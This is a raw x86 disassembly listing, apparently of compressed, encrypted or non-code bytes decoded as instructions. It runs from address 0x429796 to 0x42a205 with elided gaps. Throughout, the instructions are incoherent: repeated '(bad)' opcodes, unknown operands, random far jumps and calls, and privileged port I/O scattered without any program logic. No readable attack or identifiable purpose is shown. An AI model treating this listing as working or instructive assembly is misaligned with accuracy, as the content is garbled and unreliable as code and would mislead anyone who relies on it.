  429796:	cwde   
  429797:	sub    BYTE PTR [edx],cl
  429799:	mov    bl,0xef
  42979b:	sbb    DWORD PTR [ebp+0x5f],edi
  42979e:	push   ss
  42979f:	xchg   esi,eax
  4297a0:	jne    0x42973b
  4297a2:	adc    dl,cl
  4297a4:	and    DWORD PTR [esi-0x163211f4],0x77
  4297ab:	jno    0x42978b
  4297ad:	mov    dl,0xe7
  4297af:	and    BYTE PTR [ebp-0x9],cl
  4297b2:	fldl2t 
  4297b4:	fsubr  DWORD PTR ds:0xa41bc2d5
  4297ba:	add    DWORD PTR [ebx],ebx
  4297bc:	je     0x4297e7
  4297be:	sbb    ebp,edx
  4297c0:	jne    0x4297c3
  4297c2:	sub    ebx,esp
  4297c4:	or     cl,BYTE PTR [esp+ecx*4-0x35]
  4297c8:	and    ecx,DWORD PTR [ebx]
  4297ca:	inc    esp
  4297cb:	add    esi,DWORD PTR [edx-0x39]
  4297ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4297cf:	cmp    eax,0x62539b28
  4297d4:	push   ds
  4297d5:	adc    al,BYTE PTR [edx+0x32]
  4297d8:	jb     0x429799
  4297da:	out    0x39,eax
  4297dc:	dec    edi
  4297dd:	js     0x429818
  4297df:	leave  
  4297e0:	and    esp,DWORD PTR [edx-0x6df36c17]
  4297e6:	xor    edi,ebx
  4297e8:	shl    DWORD PTR [esi+0xf35572],cl
	...
  429856:	xor    BYTE PTR [edx-0x21],al
  429859:	(bad)  
  42985a:	(bad)  
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	xor    edx,DWORD PTR [ebp+0x3b]
  429865:	push   esi
  429866:	cmp    DWORD PTR [ecx+eax*1+0xff00],0xafff6c00
  429871:	push   ds
  429872:	xchg   ebp,eax
  429873:	je     0x429803
  429875:	mov    edx,0x1cdf92cd
  42987a:	stc    
  42987b:	add    ch,BYTE PTR [edi-0x55575a60]
  429881:	stos   BYTE PTR es:[edi],al
  429882:	fst    DWORD PTR [edi+eiz*2+0x18]
  429886:	lahf   
  429887:	test   BYTE PTR [edi+0x3d],dh
  42988a:	xor    ah,dh
  42988c:	lods   al,BYTE PTR ds:[esi]
  42988d:	mov    DWORD PTR [ecx],ecx
  42988f:	aaa    
  429890:	loopne 0x429854
  429892:	jns    0x4298c1
  429894:	xlat   BYTE PTR ds:[ebx]
  429895:	push   ebp
  429896:	arpl   WORD PTR [eax+0x51],sp
  429899:	jns    0x429838
  42989b:	adc    DWORD PTR [edi+ecx*1],esi
  42989e:	aas    
  42989f:	test   ch,ah
  4298a1:	cmp    al,0xb
  4298a3:	gs retf 
  4298a5:	jb     0x4298b9
  4298a7:	mov    esi,0x12b965c7
  4298ac:	xchg   BYTE PTR [ecx],cl
  4298ae:	rcl    bh,cl
  4298b0:	inc    ecx
  4298b1:	xor    BYTE PTR [esi+0x77eaf8fd],dh
  4298b7:	add    cl,bl
  4298b9:	ret    0x40ed
  4298bc:	sbb    BYTE PTR [esi],bh
  4298be:	push   edx
  4298bf:	cmp    DWORD PTR [eax-0x78ab5ab4],edx
  4298c5:	push   esp
  4298c6:	cmp    eax,0x90efef6
  4298cb:	scas   al,BYTE PTR es:[edi]
  4298cc:	xor    eax,0x3e295964
  4298d1:	inc    ebx
  4298d2:	adc    eax,ecx
  4298d4:	jge    0x4298b6
  4298d6:	push   edx
  4298d7:	jnp    0x429905
  4298d9:	pop    ebx
  4298da:	adc    edx,DWORD PTR [eax+ebx*4-0x4bfd259c]
  4298e1:	xor    DWORD PTR [edi-0x44778dd5],0x23
  4298e8:	rcr    BYTE PTR [eax],cl
  4298ea:	pop    esi
  4298eb:	add    ebx,DWORD PTR [eax+eiz*1-0x5f]
  4298ef:	call   0x9e18:0x446a7184
  4298f6:	retf   
  4298f7:	pop    edi
  4298f8:	pop    ds
  4298f9:	mov    esp,0x2f7aaca5
  4298fe:	imul   eax,DWORD PTR ds:0x41075277,0x3c69def9
  429908:	loope  0x429976
  42990a:	dec    edi
  42990b:	(bad)  
  42990d:	aas    
  42990e:	or     DWORD PTR [ebx],edi
  429910:	mov    DWORD PTR [ebx+edi*2],ebx
  429913:	mov    ebx,0xa6a3dda3
  429918:	mov    ds,WORD PTR [ecx-0x55e0fcc3]
  42991e:	ins    BYTE PTR es:[edi],dx
  42991f:	dec    ebx
  429920:	sbb    BYTE PTR ds:0xbffc92d6,al
  429926:	mov    ds:0x2467c64e,al
  42992b:	cmp    ebp,eax
  42992d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42992e:	jb     0x4298f5
  429930:	xchg   ecx,eax
  429931:	sub    al,BYTE PTR ds:0xbb249ca3
  429937:	jmp    0xb5ecbfd1
  42993c:	in     al,dx
  42993d:	sbb    eax,DWORD PTR [ebx+eax*1-0x15a3dc75]
  429944:	iret   
  429945:	sbb    DWORD PTR ds:0xf3d32f62,esp
  42994b:	lods   eax,DWORD PTR ds:[esi]
  42994c:	adc    eax,0xfcea2de
  429951:	retf   
  429952:	push   eax
  429953:	ret    
  429954:	ja     0x4299d1
  429956:	loop   0x429938
  429958:	je     0x4299cd
  42995a:	inc    edx
  42995b:	push   ecx
  42995c:	cmp    edi,DWORD PTR [edx+0x30]
  42995f:	or     DWORD PTR [eax+0x4e],esi
  429962:	xchg   BYTE PTR [ebx],al
  429964:	shl    BYTE PTR [ebx-0x6318be82],1
  42996a:	adc    bh,bh
  42996c:	rol    DWORD PTR [eax],1
	...
  4299d6:	push   edi
  4299d7:	push   0xdf7fdf64
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	jmp    0x1bd:0x80897f15
  4299e9:	add    bh,bh
  4299eb:	add    BYTE PTR [eax],al
  4299ed:	add    al,dl
  4299ef:	mov    eax,DWORD PTR ds:0x1df93a24
  4299f5:	aas    
  4299f6:	imul   edi,esp,0x1a
  4299f9:	jmp    0x429a29
  4299fb:	jmp    0x7d5c9111
  429a00:	icebp  
  429a01:	mov    eax,0x770188d6
  429a06:	jecxz  0x4299ed
  429a08:	adc    BYTE PTR [esi],0xca
  429a0b:	inc    edx
  429a0c:	(bad)  
  429a0d:	enter  0x84d3,0x93
  429a11:	mov    dh,0xca
  429a13:	xor    al,0x3e
  429a15:	and    DWORD PTR [edx],ecx
  429a17:	cmp    eax,0x749dcf93
  429a1c:	mov    bh,0xc2
  429a1e:	jg     0x429a94
  429a20:	xchg   ebx,eax
  429a21:	push   esi
  429a22:	or     edx,DWORD PTR [ecx]
  429a24:	into   
  429a25:	adc    DWORD PTR [ebp+0x26b47675],ecx
  429a2b:	in     eax,dx
  429a2c:	inc    esp
  429a2d:	fimul  WORD PTR [ebp-0x25]
  429a30:	pop    eax
  429a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a32:	out    dx,eax
  429a33:	popf   
  429a34:	and    al,0x78
  429a36:	jmp    0x57b05d47
  429a3b:	loope  0x429a3d
  429a3d:	cmp    BYTE PTR [edx],dh
  429a3f:	lds    edx,FWORD PTR [edi+edx*8-0x29c9331]
  429a46:	(bad)  
  429a47:	lods   eax,DWORD PTR ds:[esi]
  429a48:	sbb    al,0xd3
  429a4a:	fdiv   DWORD PTR [ebx]
  429a4c:	mov    dh,0xc9
  429a4e:	shl    DWORD PTR [edx-0x17],cl
  429a51:	out    dx,al
  429a52:	cli    
  429a53:	retf   
  429a54:	ss push 0xcb7fc58a
  429a5a:	mov    ?,ebp
  429a5c:	mov    dl,0x81
  429a5e:	out    dx,eax
  429a5f:	sbb    DWORD PTR [esi],0x69382ed0
  429a65:	xlat   BYTE PTR ds:[ebx]
  429a66:	pop    esp
  429a67:	(bad)  
  429a68:	adc    ecx,edi
  429a6a:	addr16 jmp 0x429a64
  429a6d:	adc    ah,BYTE PTR cs:[eax+0x7f]
  429a71:	pop    edi
  429a72:	push   cs
  429a73:	(bad)  
  429a74:	jmp    0x88430c48
  429a79:	test   al,0x3e
  429a7b:	jb     0x429acf
  429a7d:	je     0x429ade
  429a7f:	mov    cl,0x98
  429a81:	and    al,0x7a
  429a83:	(bad)  
  429a84:	in     al,dx
  429a85:	outs   dx,DWORD PTR ds:[esi]
  429a86:	les    ecx,FWORD PTR [edx+eax*8+0x5b]
  429a8a:	cld    
  429a8b:	aas    
  429a8c:	or     eax,0x8a332ba2
  429a91:	out    0x6a,al
  429a93:	test   al,0xf2
  429a95:	cmp    eax,0x1a0f7f2c
  429a9a:	or     BYTE PTR gs:[edx-0x1],dl
  429a9e:	xchg   edi,eax
  429a9f:	call   0xf3e7b213
  429aa4:	jp     0x429af7
  429aa6:	fidiv  WORD PTR [ebp+0x0]
  429aa9:	fild   QWORD PTR [edi+0x9]
  429aac:	loop   0x429a67
  429aae:	push   edx
  429aaf:	stc    
  429ab0:	popa   
  429ab1:	sbb    DWORD PTR [eax],ecx
  429ab3:	pop    eax
  429ab4:	adc    ebx,DWORD PTR [eax+0x91adc73]
  429aba:	imul   esp,DWORD PTR [edx+esi*8+0x77],0xffffff80
  429abf:	mov    WORD PTR [edx],fs
  429ac1:	std    
  429ac2:	xchg   esp,eax
  429ac3:	xchg   BYTE PTR [ebp+0x73e9b9cc],bl
  429ac9:	adc    BYTE PTR [ebp-0x48a01a38],0xef
  429ad0:	pop    es
  429ad1:	lods   eax,DWORD PTR ds:[esi]
  429ad2:	jns    0x429ac6
  429ad4:	jae    0x429b4b
  429ad6:	jp     0x429b01
  429ad8:	push   esi
  429ad9:	mov    ebx,gs
  429adb:	sbb    ebx,DWORD PTR [ebx+0x27]
  429ade:	scas   al,BYTE PTR es:[edi]
  429adf:	rcr    BYTE PTR [edx+0x7ba3c5a1],cl
  429ae5:	pop    edx
  429ae6:	inc    eax
  429ae7:	ret    
  429ae8:	lea    ecx,[eax]
  429aea:	stc    
  429aeb:	out    dx,eax
  429aec:	inc    eax
	...
  429b55:	add    dh,cl
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0xb1a95667
  429b63:	or     DWORD PTR [eax-0x68],0x1be7f
  429b6a:	inc    DWORD PTR [eax]
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	sub    DWORD PTR [ecx-0x41],esi
  429b71:	hlt    
  429b72:	push   edx
  429b73:	xchg   edi,eax
  429b74:	std    
  429b75:	sub    al,BYTE PTR [ecx]
  429b77:	dec    esi
  429b78:	add    al,0x3d
  429b7a:	xor    al,0xc5
  429b7c:	adc    eax,0x4f2ca860
  429b81:	inc    ecx
  429b82:	ret    
  429b83:	sub    al,0x4
  429b85:	add    eax,0x2966e58c
  429b8a:	adc    al,0xd4
  429b8c:	outs   dx,DWORD PTR ss:[esi]
  429b8e:	fnstenv [ebx-0x5a]
  429b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b92:	pop    ebx
  429b93:	jae    0x429b91
  429b95:	xchg   ebx,eax
  429b96:	imul   BYTE PTR [eax]
  429b98:	pop    ds
  429b99:	push   ds
  429b9a:	push   esp
  429b9b:	cmp    esi,DWORD PTR [edi]
  429b9d:	scas   eax,DWORD PTR es:[edi]
  429b9e:	retf   0xcd64
  429ba1:	int3   
  429ba2:	test   al,0xd9
  429ba4:	call   0x9779:0x99ecdc8
  429bab:	or     edx,DWORD PTR [ebx-0x60]
  429bae:	mov    DWORD PTR [edx-0x3acf2ca2],ebx
  429bb4:	xchg   ecx,eax
  429bb5:	stos   DWORD PTR es:[edi],eax
  429bb6:	inc    edi
  429bb7:	push   0xfffffffb
  429bb9:	pop    es
  429bba:	jno    0x429c04
  429bbc:	mov    dl,0x70
  429bbe:	scas   eax,DWORD PTR es:[edi]
  429bbf:	mov    bl,0xe7
  429bc1:	sbb    ebx,DWORD PTR [ebx+0x71]
  429bc4:	mov    ebp,0x33c76f60
  429bc9:	sbb    bh,BYTE PTR [eax]
  429bcb:	js     0x429bcc
  429bcd:	mov    dl,0xc
  429bcf:	mov    gs,WORD PTR [edi+eiz*2+0x569076d8]
  429bd6:	aam    0x8e
  429bd8:	dec    edx
  429bd9:	popf   
  429bda:	mov    edi,0xcad7ce16
  429bdf:	sbb    bl,cl
  429be1:	adc    ch,BYTE PTR [esi-0x43]
  429be4:	ins    DWORD PTR es:[edi],dx
  429be5:	mov    ds,WORD PTR es:0x653fc725
  429bec:	stos   DWORD PTR es:[edi],eax
  429bed:	mov    ebx,0xdfb9019f
  429bf2:	cmp    ecx,DWORD PTR es:[esi]
  429bf5:	test   bl,ah
  429bf7:	out    0x9d,al
  429bf9:	imul   esi,ebp,0x6d1a4293
  429bff:	sbb    eax,0x56f5482
  429c04:	repz sbb BYTE PTR [ecx+ebp*4-0x69b5e156],ch
  429c0c:	adc    cl,al
  429c0e:	ret    
  429c0f:	sub    DWORD PTR [edi-0x5d],edx
  429c12:	dec    ebx
  429c13:	aam    0x6f
  429c15:	es mov al,0xfa
  429c18:	push   ebp
  429c19:	aas    
  429c1a:	shl    BYTE PTR [ecx+0x4c],0x77
  429c1e:	dec    ebp
  429c1f:	out    0x36,al
  429c21:	das    
  429c22:	push   edi
  429c23:	pop    eax
  429c24:	xchg   esi,eax
  429c25:	shr    BYTE PTR [ebx+0x60c2933c],1
  429c2b:	out    0x83,eax
  429c2d:	sti    
  429c2e:	aas    
  429c2f:	and    DWORD PTR [esi-0x5],ebx
  429c32:	mov    BYTE PTR [ebp+0x27],cl
  429c35:	out    dx,al
  429c36:	cmp    ch,bl
  429c38:	adc    eax,0x8956e7c5
  429c3d:	jno    0x429bcd
  429c3f:	jbe    0x429cb6
  429c41:	into   
  429c42:	call   0xfa01f6df
  429c47:	xor    eax,0x49cce0e6
  429c4c:	xlat   BYTE PTR ds:[ebx]
  429c4d:	adc    esi,DWORD PTR [edi]
  429c4f:	iret   
  429c50:	int3   
  429c51:	sbb    bh,ch
  429c53:	imul   ebx,ebx,0xffffffd4
  429c56:	ins    DWORD PTR es:[edi],dx
  429c57:	push   0xdd8f62d4
  429c5c:	test   eax,0x71b1db35
  429c61:	fist   WORD PTR [esi]
  429c63:	xlat   BYTE PTR ds:[ebx]
  429c64:	push   eax
  429c65:	adc    DWORD PTR [edi],ebp
  429c67:	mov    eax,?
  429c69:	mov    ebp,0xb6b782
	...
  429cd6:	mov    ds:0xb788a616,eax
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    BYTE PTR [esi],cl
  429ce3:	and    al,0x2b
  429ce5:	mov    esp,0x1bf7e
  429cea:	inc    DWORD PTR [eax]
  429cec:	add    BYTE PTR [eax],al
  429cee:	xlat   BYTE PTR ds:[ebx]
  429cef:	push   0xffffffb1
  429cf1:	test   al,0xa3
  429cf3:	imul   DWORD PTR [esi-0x1f]
  429cf6:	mov    bh,0xc7
  429cf8:	aad    0x23
  429cfa:	add    BYTE PTR [ebx-0x193d2741],0x35
  429d01:	ja     0x429cad
  429d03:	jmp    0x429cd4
  429d05:	call   0x482dd7f0
  429d0a:	pop    ebx
  429d0b:	dec    edx
  429d0c:	xor    bh,BYTE PTR [esi+edx*1+0x68]
  429d10:	test   eax,0x864d524d
  429d15:	mov    DWORD PTR [ecx],ecx
  429d17:	mov    al,0xe
  429d19:	or     BYTE PTR [ebp+0x4052d35b],ah
  429d1f:	cmp    bl,BYTE PTR [ebx*8+0xa6a5531]
  429d26:	sub    DWORD PTR [eax],ebp
  429d28:	adc    BYTE PTR [edi+ebx*4-0x14],ch
  429d2c:	pop    ecx
  429d2d:	call   0xb3f94c48
  429d32:	or     edi,DWORD PTR [edx]
  429d34:	push   ebp
  429d35:	xor    DWORD PTR [edx+0x1e29bb96],0x12af4ffa
  429d3f:	mov    ebx,0x36a54ff8
  429d44:	sub    BYTE PTR [ecx],al
  429d46:	rol    DWORD PTR [ebp+0x5f],0xdb
  429d4a:	lods   eax,DWORD PTR ds:[esi]
  429d4b:	ss fcmovnb st,st(4)
  429d4e:	mov    edx,0xca5304d8
  429d53:	sbb    ah,BYTE PTR [ebx+0x4a]
  429d56:	xchg   ebp,eax
  429d57:	cmp    BYTE PTR [ecx+0x15],bh
  429d5a:	bound  eax,QWORD PTR [eax]
  429d5c:	and    eax,0xa4a8c0b6
  429d61:	leave  
  429d62:	cmp    eax,0x6c485611
  429d67:	cmc    
  429d68:	(bad)  
  429d69:	outs   dx,DWORD PTR ds:[esi]
  429d6a:	or     eax,0xf9e63cc6
  429d6f:	clc    
  429d70:	jmp    0x429d12
  429d72:	jb     0x429d3a
  429d74:	loope  0x429d8b
  429d76:	les    edi,FWORD PTR [esi+0x45]
  429d79:	loopne 0x429d6b
  429d7b:	(bad)  
  429d7c:	ds in  al,dx
  429d7e:	xchg   DWORD PTR ds:0x84579a4b,esp
  429d84:	sbb    ebp,ecx
  429d86:	push   0xffffffc4
  429d88:	push   esi
  429d89:	(bad)  
  429d8a:	das    
  429d8b:	stos   DWORD PTR es:[edi],eax
  429d8c:	and    DWORD PTR cs:[eax-0x4d9d03f0],ecx
  429d93:	mov    al,0xbe
  429d95:	cld    
  429d96:	mov    al,ds:0x5f60431e
  429d9b:	out    0xfa,al
  429d9d:	jno    0x429d98
  429d9f:	je     0x429e0d
  429da1:	jl     0x429e1b
  429da3:	and    al,0x3d
  429da5:	loope  0x429da6
  429da7:	xor    edi,DWORD PTR [eax-0x3e]
  429daa:	ds mov edx,0x8714b24b
  429db0:	hlt    
  429db1:	or     DWORD PTR [esp+edi*1+0x74],ebx
  429db5:	add    BYTE PTR [eax+0x73a30ff6],dl
  429dbb:	mov    bh,al
  429dbd:	cdq    
  429dbe:	repnz add BYTE PTR [edx],dh
  429dc1:	sub    BYTE PTR [eax+0x7c9bc6d8],dl
  429dc7:	xor    al,0x3a
  429dc9:	scas   al,BYTE PTR es:[edi]
  429dca:	add    DWORD PTR [esi],0x3a
  429dcd:	lea    ebx,[edx-0x69363b94]
  429dd3:	test   DWORD PTR [eax-0x66],esi
  429dd6:	mov    dl,0x4
  429dd8:	mov    ch,0x33
  429dda:	adc    DWORD PTR cs:[ebp-0x77a4eb0],0x70
  429de2:	or     al,0x5d
  429de4:	push   esp
  429de5:	sub    BYTE PTR [ebx+0x3e44f41c],bl
  429deb:	arpl   WORD PTR ds:0x0,ax
	...
  429e55:	add    BYTE PTR [ebx-0x13f33b49],bl
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	jno    0x429eda
  429e64:	div    DWORD PTR [ebx+0x7d]
  429e67:	rol    BYTE PTR [ecx],0x0
  429e6a:	inc    DWORD PTR [eax]
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	mov    bh,0x1a
  429e70:	icebp  
  429e71:	lahf   
  429e72:	ror    BYTE PTR [ecx-0x58],0x79
  429e76:	cmp    al,0xf1
  429e78:	cmc    
  429e79:	data16 in al,dx
  429e7b:	jbe    0x429e3b
  429e7d:	daa    
  429e7e:	inc    edi
  429e7f:	fidiv  WORD PTR [ecx-0x484707b5]
  429e85:	outs   dx,DWORD PTR ds:[esi]
  429e86:	xor    eax,0x45d64e59
  429e8b:	popf   
  429e8c:	or     cl,ch
  429e8e:	es test al,0x15
  429e91:	mov    BYTE PTR [ebp+0x56],bh
  429e94:	inc    edx
  429e95:	cmp    al,BYTE PTR [edx]
  429e97:	aas    
  429e98:	pop    es
  429e99:	aaa    
  429e9a:	ins    DWORD PTR es:[edi],dx
  429e9b:	inc    ebx
  429e9c:	rcl    BYTE PTR [ecx-0xf],cl
  429e9f:	pop    es
  429ea0:	sub    al,0xdb
  429ea2:	and    esi,eax
  429ea4:	rcr    ecx,0xee
  429ea7:	shl    DWORD PTR [ecx+0x1c3839e7],0x58
  429eae:	adc    DWORD PTR [ecx],ebx
  429eb0:	adc    ebx,DWORD PTR [ecx]
  429eb2:	fucomi st,st(3)
  429eb4:	fdivr  DWORD PTR [edx+0x2666e645]
  429eba:	stc    
  429ebb:	jecxz  0x429f0f
  429ebd:	xor    dh,cl
  429ebf:	cmp    BYTE PTR [ecx+0x584842cb],bl
  429ec5:	es cwde 
  429ec7:	sub    DWORD PTR [ecx+0xf],edi
  429eca:	sti    
  429ecb:	xor    BYTE PTR [ebx-0x32],dl
  429ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ecf:	mov    ecx,0xed5a4f05
  429ed4:	ret    0x7e52
  429ed7:	dec    eax
  429ed8:	and    BYTE PTR [ecx],dl
  429eda:	adc    DWORD PTR [ecx+0x3c],0xffffffe1
  429ede:	xchg   DWORD PTR [edx-0x6a],esi
  429ee1:	mov    dh,0x5b
  429ee3:	test   al,0xd8
  429ee5:	(bad)  
  429ee6:	lock sub DWORD PTR [eax-0x4402f4a3],edx
  429eed:	and    dh,al
  429eef:	mov    eax,DWORD PTR [edx]
  429ef1:	bound  ebp,QWORD PTR [edx]
  429ef3:	test   DWORD PTR ds:0x81ffbc4d,ebp
  429ef9:	jl     0x429ed2
  429efb:	mov    al,al
  429efd:	repnz push esp
  429eff:	and    ebp,esp
  429f01:	pop    DWORD PTR [ecx-0x3f]
  429f04:	fcomp  DWORD PTR [esp+ebx*2+0xf]
  429f08:	ja     0x429f05
  429f0a:	test   eax,0x75385993
  429f0f:	out    0x11,al
  429f11:	fstp   DWORD PTR [eax-0xbeddb5]
  429f17:	loope  0x429f1e
  429f19:	sub    al,0x82
  429f1b:	mov    ah,0xd4
  429f1d:	adc    ebp,DWORD PTR [edx]
  429f1f:	pop    esp
  429f20:	xchg   esi,eax
  429f21:	or     eax,0x51dff331
  429f26:	add    dh,ah
  429f28:	out    0x6a,al
  429f2a:	jns    0x429f6e
  429f2c:	in     eax,0xb0
  429f2e:	out    dx,eax
  429f2f:	imul   edi,DWORD PTR [esi+0x7],0xffffff8f
  429f33:	dec    edx
  429f34:	popa   
  429f35:	mov    dh,0x5a
  429f37:	adc    dl,BYTE PTR [esi-0x3b]
  429f3a:	jo     0x429f87
  429f3c:	ret    0x9727
  429f3f:	and    bh,BYTE PTR [edx+ebx*4-0x33b578ab]
  429f46:	clc    
  429f47:	or     BYTE PTR [edi+0x57b59b7b],bh
  429f4d:	or     bh,cl
  429f4f:	mov    cl,0x4c
  429f51:	cmp    eax,0x13a64d25
  429f56:	outs   dx,DWORD PTR ds:[esi]
  429f57:	fild   DWORD PTR [esi]
  429f59:	xchg   esp,eax
  429f5a:	gs push esp
  429f5c:	sbb    BYTE PTR ds:0xfeb3cf1d,al
  429f62:	aas    
  429f63:	fdivr  QWORD PTR [ebx+ebp*4]
  429f66:	call   0xbc9c435e
  429f6b:	stos   BYTE PTR es:[edi],al
  429f6c:	outs   dx,BYTE PTR ds:[esi]
	...
  429fd5:	add    BYTE PTR [ecx],dh
  429fd7:	inc    ebp
  429fd8:	enter  0xfc06,0x8f
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx-0x4265d3de]
  429fe6:	jl     0x429fa9
  429fe8:	add    DWORD PTR [eax],eax
  429fea:	inc    DWORD PTR [eax]
  429fec:	add    BYTE PTR [eax],al
  429fee:	jno    0x429f86
  429ff0:	repz fcomp DWORD PTR [ebp+eiz*8-0x4637c021]
  429ff8:	push   es
  429ff9:	popf   
  429ffa:	aam    0x57
  429ffc:	pop    esp
  429ffd:	add    dl,bl
  429fff:	mov    ebp,0x395acbe3
  42a004:	xchg   ecx,eax
  42a005:	and    eax,0x51a4a5cd
  42a00a:	retf   
  42a00b:	or     eax,ecx
  42a00d:	jmp    0xa8e0:0x73446123
  42a014:	(bad)  
  42a015:	push   esp
  42a016:	(bad)  
  42a017:	xor    al,0xc
  42a019:	sbb    edx,DWORD PTR [edi+ebp*4]
  42a01c:	xor    DWORD PTR [ebp+0x2],0xd0d8a579
  42a023:	pushf  
  42a024:	sbb    DWORD PTR [ecx+0x7b3da26b],0x5331ab84
  42a02e:	test   eax,0xbc7c41f
  42a033:	test   esp,ebx
  42a035:	lds    eax,FWORD PTR [ecx]
  42a037:	mov    edx,0xc4f61a97
  42a03c:	sbb    BYTE PTR [eax+0x148ff8c6],bl
  42a042:	inc    edi
  42a043:	pop    edi
  42a044:	mov    ah,0xbb
  42a046:	into   
  42a047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a048:	clc    
  42a049:	nop
  42a04a:	mov    ah,BYTE PTR [edi-0x1b7fa00c]
  42a050:	adc    eax,0xb01714a2
  42a055:	les    esp,FWORD PTR [edi-0x67313388]
  42a05b:	push   0xffffffcd
  42a05d:	add    ch,BYTE PTR [edx+ecx*2+0x6f]
  42a061:	pop    ss
  42a062:	cmp    DWORD PTR [ecx-0x49],esp
  42a065:	arpl   WORD PTR [ebp+ebx*2-0x560b8c25],bx
  42a06c:	clc    
  42a06d:	ins    BYTE PTR es:[edi],dx
  42a06e:	popa   
  42a06f:	(bad)
  42a072:	lds    edi,FWORD PTR [edi+0x457664e5]
  42a078:	jnp    0x42a0f3
  42a07a:	xchg   DWORD PTR [edi-0x37],edx
  42a07d:	push   cs
  42a07e:	in     eax,dx
  42a07f:	and    ebp,edx
  42a081:	sbb    al,0xc6
  42a083:	in     eax,dx
  42a084:	sbb    esp,0x4a96dcbe
  42a08a:	sub    DWORD PTR [ebp+edi*1-0x35],esi
  42a08e:	cmp    ah,BYTE PTR ds:0xce4fc4a7
  42a094:	cmp    al,0xf9
  42a096:	adc    DWORD PTR [esi-0x121b2433],ebp
  42a09c:	jnp    0x42a0b3
  42a09e:	bound  ebp,QWORD PTR [esi]
  42a0a0:	or     DWORD PTR [edi+0x6976f6b7],edi
  42a0a6:	in     eax,0x13
  42a0a8:	lods   al,BYTE PTR ds:[esi]
  42a0a9:	add    BYTE PTR [ebx+eiz*2-0x21],dh
  42a0ad:	xchg   DWORD PTR [esi],esi
  42a0af:	retf   0x237b
  42a0b2:	sub    bl,BYTE PTR [ecx-0x74]
  42a0b5:	xchg   ecx,eax
  42a0b6:	pushf  
  42a0b7:	das    
  42a0b8:	mov    cl,0x9c
  42a0ba:	mov    dh,BYTE PTR [edx]
  42a0bc:	jmp    0x42a061
  42a0be:	xchg   DWORD PTR [edx-0x2c],ecx
  42a0c1:	iret   
  42a0c2:	mov    esi,0x23296f09
  42a0c7:	inc    esp
  42a0c8:	hlt    
  42a0c9:	mov    eax,ds:0xe52d088d
  42a0ce:	dec    ebx
  42a0cf:	jae    0x42a145
  42a0d1:	xlat   BYTE PTR ds:[ebx]
  42a0d2:	xor    DWORD PTR [edx+0x75f58afe],ebp
  42a0d8:	outs   dx,DWORD PTR ds:[esi]
  42a0d9:	push   0xab6bec7e
  42a0de:	hlt    
  42a0df:	jo     0x42a0f9
  42a0e1:	sbb    ch,al
  42a0e3:	retf   
  42a0e4:	(bad)  
  42a0e5:	sbb    al,0x6e
  42a0e7:	inc    ebp
  42a0e8:	mov    ecx,DWORD PTR [ecx+ebx*8+0x2381]
	...
  42a153:	add    BYTE PTR [eax],al
  42a155:	add    bh,dl
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	sbb    dl,dh
  42a164:	pop    edx
  42a165:	or     eax,0x1c27b
  42a16a:	inc    DWORD PTR [eax]
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	or     eax,0xc99988f0
  42a173:	inc    ebp
  42a174:	test   BYTE PTR [esi],0x59
  42a177:	or     BYTE PTR [edx-0x41],bl
  42a17a:	(bad)  
  42a17b:	pop    ds
  42a17c:	stc    
  42a17d:	pop    ds
  42a17e:	sbb    DWORD PTR [edx],ebp
  42a180:	jo     0x42a163
  42a182:	lds    eax,FWORD PTR [edi-0x62ce0f6]
  42a188:	mov    ch,0x8d
  42a18a:	in     eax,dx
  42a18b:	mov    ss,esp
  42a18d:	mov    eax,ds:0xbe34158a
  42a192:	lahf   
  42a193:	(bad)
  42a196:	lahf   
  42a197:	pop    ebx
  42a198:	xchg   edi,eax
  42a199:	and    eax,0x35ca63d7
  42a19e:	xchg   ebp,eax
  42a19f:	inc    edx
  42a1a0:	push   cs
  42a1a1:	dec    ebx
  42a1a2:	gs in  al,0x7c
  42a1a5:	mul    eax
  42a1a7:	mov    bh,0xf8
  42a1a9:	cmp    DWORD PTR ds:0xdc0491c1,0x34
  42a1b0:	shl    DWORD PTR ds:0x848fa8b1,cl
  42a1b6:	dec    ebp
  42a1b7:	fdivrp st(0),st
  42a1b9:	repz (bad) 
  42a1bb:	fiadd  DWORD PTR [esi]
  42a1bd:	xchg   DWORD PTR [edi+ebx*4],edx
  42a1c0:	xchg   al,cl
  42a1c2:	jno    0x42a14d
  42a1c4:	enter  0xfc69,0xc7
  42a1c8:	neg    DWORD PTR cs:[esi-0x4d5eb040]
  42a1cf:	mov    ss,edi
  42a1d1:	gs and eax,0xaaa5b8d6
  42a1d7:	cmp    BYTE PTR [ebp-0x6c2d013b],ah
  42a1dd:	ficomp DWORD PTR [edi+0x5e812f12]
  42a1e3:	mov    WORD PTR [ecx+0x4e],ds
  42a1e6:	outs   dx,DWORD PTR ds:[esi]
  42a1e7:	iret   
  42a1e8:	jbe    0x42a1d6
  42a1ea:	xchg   BYTE PTR [esp+ebp*2],dh
  42a1ed:	xchg   edi,eax
  42a1ee:	int3   
  42a1ef:	lds    edi,FWORD PTR [ecx-0x51]
  42a1f2:	xchg   ch,dh
  42a1f4:	daa    
  42a1f5:	dec    ebx
  42a1f6:	sar    DWORD PTR [ebp-0x539e1303],cl
  42a1fc:	mov    ds:0x67789f8c,al
  42a201:	outs   dx,BYTE PTR ds:[esi]
  42a202:	repnz loopne 0x42a272
  42a205:	cmp    ch,0x49
